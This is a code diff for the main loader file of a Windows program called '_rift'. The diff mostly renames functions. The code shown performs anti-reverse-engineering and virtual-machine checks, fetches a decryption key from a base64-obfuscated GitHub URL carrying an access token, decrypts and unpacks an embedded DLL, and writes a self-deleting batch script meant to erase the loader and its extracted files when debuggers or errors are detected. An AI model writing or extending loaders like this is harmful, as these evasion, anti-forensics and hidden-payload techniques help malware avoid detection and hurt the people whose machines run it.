@@ -1,7 +1,7 @@
 #include "pch.h"
 #include "_rift.h"
 
-PVOID fnDownloadKey();
+PVOID IDownloadKey();
 
 INT WINAPI wWinMain(
 	_In_     HINSTANCE hInstance,
@@ -24,49 +24,49 @@ INT WINAPI wWinMain(
 	// Protect Process
 	BOOL bRE = fnAntiRE();
 #endif
-	fnInitializeXSR();
+	EXoshiroBegin();
 
 	{	// Test base64
 		PVOID string = AllocMemory(259, 0);
 		for (int i = 0; i < 259; i++)
-			((PBYTE)string)[i] = (BYTE)(fnNext128p() >> 24);
+			((PBYTE)string)[i] = (BYTE)(EXoshiroP() >> 24);
 		CopyMemory(string, "https://raw.githubusercontent.com/Lima-X-Coding/Win32._rift/master/_rift/main.c?token=AISLTIFBLEXNHDBHX6Z2FOS63QJ3U", 116);
-		fnMd5HashingBegin();
-		PVOID hash = fnMD5HashData(string, 4);
+		EMd5HashBegin();
+		PVOID hash = EMd5HashData(string, 4);
 
 		SIZE_T bout;
-		PVOID base = fnB64Encode(string, 116, &bout);
+		PVOID base = EBase64Encode(string, 116, &bout);
 		FreeMemory(string);
-		PVOID base2 = fnB64Decode(base, bout, &bout);
+		PVOID base2 = EBase64Decode(base, bout, &bout);
 		FreeMemory(base);
 
-		PVOID hash2 = fnMD5HashData(base2, 4);
+		PVOID hash2 = EMd5HashData(base2, 4);
 		FreeMemory(base2);
-		BOOL test = fnMD5Compare(hash, hash2);
+		BOOL test = EMd5Compare(hash, hash2);
 
 		FreeMemory(hash);
 		FreeMemory(hash2);
 	}
 
-	PVOID pKey = fnDownloadKey();
-	if (!pKey) {
+	PVOID pWKey = IDownloadKey();
+	if (!pWKey) {
 		PWSTR szKeyBlob = (PWSTR)AllocMemory(MAX_PATH, 0);
-		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->szCD, L"..\\RIFTKEY");
+		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->szCD, L"..\\RIFTWKEY"); // Temporery
 		DWORD nKeyBlob;
-		pKey = fnAllocReadFileW(szKeyBlob, &nKeyBlob);
+		pWKey = AllocReadFileW(szKeyBlob, &nKeyBlob);
 	}
-	fnAesCryptBegin();
-	fnAesLoadKey(pKey);
+	EAesCryptBegin();
+	IAesLoadWKey(pWKey);
 
 	// init con
-	fnOpenConsole();
+	IOpenConsole();
 
-	BOOL bVM = fnCheckVMPresent();
+	BOOL bVM = ICheckVmPresent();
 
 	SIZE_T nDll;
-	PVOID pDll = fnUnpackResource(IDR_RIFTDLL, &nDll);
-	fnAesCryptEnd();
-	fnMd5HashingEnd();
+	PVOID pDll = EUnpackResource(IDR_RIFTDLL, &nDll);
+	EAesCryptEnd();
+	EMd5HashEnd();
 	if (!pDll)
 		return 0x1;
 
@@ -101,8 +101,8 @@ INT WINAPI wWinMain(
 }
 
 // Only Test rn but might be implemented further
-PVOID fnDownloadKey() {
-	PCWSTR szAgent = fnAllocRandomB64W(8, 16);
+PVOID IDownloadKey() {
+	PCWSTR szAgent = EAllocRandomBase64StringW(8, 16);
 	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
 	if (!hNet)
 		return 0;
@@ -110,7 +110,7 @@ PVOID fnDownloadKey() {
 
 	PCSTR szB64URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xpbWEtWC1Db2RpbmcvV2luMzIuX3JpZnQvbWFzdGVyL19yaWZ0L21haW4uYz90b2tlbj1BSVNMVElGQkxFWE5IREJIWDZaMkZPUzYzUUozVQA=";
 	SIZE_T nURL;
-	PCSTR szURL = fnB64Decode(szB64URL, 156, &nURL);
+	PCSTR szURL = EBase64Decode(szB64URL, 156, &nURL);
 	HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, 0, 0, 0, 0);
 	if (!hUrl)
 		return 0;
@@ -134,7 +134,7 @@ PVOID fnDownloadKey() {
 	all traces of it self (the loader and everything else it extracts).
 	It should get triggered ( / called) if any fatal error occurs,
 	or the loader catches any suspicious activities (e.g. debuggers).  */
-static CONST WCHAR t_szSelfDelBat[] = {
+static CONST WCHAR l_szSelfDelBat[] = {
 	L"@echo off\n"
 	L"%x:\n"
 	L"\tdel \"%s\" /f\n"
@@ -143,29 +143,29 @@ static CONST WCHAR t_szSelfDelBat[] = {
 	L"\t)\n"
 	L"del \"%s\" /f"
 };
-VOID fnPurge() {
+VOID ESelfDestruct() {
 	// Prepare String for Filename of Batchfile
 	PWSTR szFilePath = (PWSTR)AllocMemory(MAX_PATH * sizeof(WCHAR), 0);
 	SIZE_T nRandom;
-	PCWSTR szRandom = fnAllocRandomPathW(8, 16, &nRandom);
+	PCWSTR szRandom = EAllocRandomPathW(8, 16, &nRandom);
 	CopyMemory(szFilePath, g_PIB->szCD, MAX_PATH * sizeof(WCHAR));
 	PathCchAppend(szFilePath, MAX_PATH * sizeof(WCHAR), szRandom);
 	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");
 
 	// Prepare Script content
 	PVOID pScriptW = AllocMemory(0x800, 0);
-	UINT uiRandomID = fnNext128ss();
-	PCWSTR szMFN = fnGetFileNameFromPathW(g_PIB->szMFN);
-	StringCchPrintfW(pScriptW, 0x400, t_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, fnGetFileNameFromPathW(szFilePath));
+	UINT uiRandomID = EXoshiroSS();
+	PCWSTR szMFN = GetFileNameFromPathW(g_PIB->szMFN);
+	StringCchPrintfW(pScriptW, 0x400, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, GetFileNameFromPathW(szFilePath));
 
 	// Convert to Raw (ANSI)
 	SIZE_T nScript;
 	StringCchLengthW(pScriptW, 0x400, &nScript);
-	PSTR pScriptA = (PSTR)HeapAlloc(g_PIB->hPH, 0, 0x400);
+	PSTR pScriptA = AllocMemory(0x400, 0);
 	WideCharToMultiByte(CP_ACP, 0, pScriptW, -1, pScriptA, 0x400, 0, 0);
 	FreeMemory(pScriptW);
 
 	// Write to Disk
-	fnWriteFileCW(szFilePath, pScriptA, nScript);
+	WriteFileCW(szFilePath, pScriptA, nScript);
 	FreeMemory(pScriptA);
 }
